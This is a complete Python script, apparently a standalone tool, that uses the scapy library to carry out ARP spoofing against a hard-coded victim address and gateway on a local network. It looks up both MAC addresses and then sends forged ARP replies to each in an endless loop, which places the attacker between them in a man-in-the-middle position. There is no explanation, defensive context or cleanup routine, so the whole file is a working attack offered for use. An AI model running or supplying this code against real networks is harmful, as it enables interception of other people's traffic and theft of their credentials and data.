import scapy.all as scapy

gateway_ip ="192.168.1.1"
victim_ip ="192.168.1.249"

def GetMac(ipaddress):
    arprequest = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ipaddress)
    reply, x = scapy.srp(arprequest, timeout = 3, verbose = 0)
    if reply:
        return reply[0][1].src
    return None

def spoofing(victim_ip, victim_mac, fakeip):
    scapy.send(scapy.ARP(pdst=victim_ip, hwdst= victim_mac, psrc=fakeip, op="is-at"),verbose = 0)

def WaitMac(ip):
    mac = None
    while not mac:
        mac = GetMac(ip)
        if not mac:
            print("Mac address not found yet.")
    return mac

targetmac = WaitMac(victim_ip)
getwaymac = WaitMac(gateway_ip)
while True:
     spoofing(victim_ip,targetmac,gateway_ip)
     spoofing(gateway_ip,getwaymac,victim_ip)
     print("active")
     